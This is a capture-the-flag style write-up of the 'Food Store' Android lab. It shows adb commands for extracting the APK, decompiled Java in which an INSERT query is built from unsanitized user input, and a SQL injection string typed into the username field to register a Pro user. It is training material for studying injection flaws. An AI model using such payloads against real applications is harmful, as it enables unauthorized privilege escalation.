---
layout: post
title: FoodStore Mobile Hacking Labs
date: 2024-09-29 11:19 -0400
img_path: /assets/img/FoodStore/
published: true
categories: ["Mobile Challenge","Mobile Hacking Lab"]
tags: ["SQLi", "Static analysis"]
toc: true
---
# Lab - Food Store

Exploit the SQL Injection vulnerability, allowing you to register as a Pro user, bypassing standard user restrictions.

## Approach

- Analyze the Signup Function: Scrutinize the app's signup process for SQLi vulnerabilities.
- Craft Malicious SQL Queries: Develop SQL queries to manipulate the signup process and gain Pro user access.
- Test and Validate: Execute your SQLi strategies within the provided lab environment.

## Challenge review

First we extract the apk using adb
```sh
frida-ps -Uia
adb shell pm path com.mobilehackinglab.foodstore
adb pull /data/app/~~cD86vRrl8vj6VjW90wvouQ==/com.mobilehackinglab.foodstore-9dxJBdRdVCfFVUKfmYaWLw==/base.apk footStore.apk
```

We notice tree activites declare in the manifest

```xml
        <activity
            android:name="com.mobilehackinglab.foodstore.Signup"
            android:exported="false"/>
        <activity
            android:name="com.mobilehackinglab.foodstore.MainActivity"
            android:exported="true"/>
        <activity
            android:name="com.mobilehackinglab.foodstore.LoginActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
```

Lets check the Signup activity that calls this function ``dbHelper.addUser(newUser)`` with the object User initialized with our data input. This functiopn addUsers seems vulnerable to SQL injection

```java
   public final void addUser(User user) {
        Intrinsics.checkNotNullParameter(user, "user");
        SQLiteDatabase db = getWritableDatabase();
        byte[] bytes = user.getPassword().getBytes(Charsets.UTF_8);
        Intrinsics.checkNotNullExpressionValue(bytes, "this as java.lang.String).getBytes(charset)");
        String encodedPassword = Base64.encodeToString(bytes, 0);
        String Username = user.getUsername();
        byte[] bytes2 = user.getAddress().getBytes(Charsets.UTF_8);
        Intrinsics.checkNotNullExpressionValue(bytes2, "this as java.lang.String).getBytes(charset)");
        String encodedAddress = Base64.encodeToString(bytes2, 0);
        String sql = "INSERT INTO users (username, password, address, isPro) VALUES ('" + Username + "', '" + encodedPassword + "', '" + encodedAddress + "', 0)";
        db.execSQL(sql);
        db.close();
    }
```

so we can use de Username field to modify the sql, probably something like ``admin','MTIz','MTIz',1)-- ``, we need to add a user that has the field **isPro** activated

![alt text](image.png)

![admingg](image-1.png)

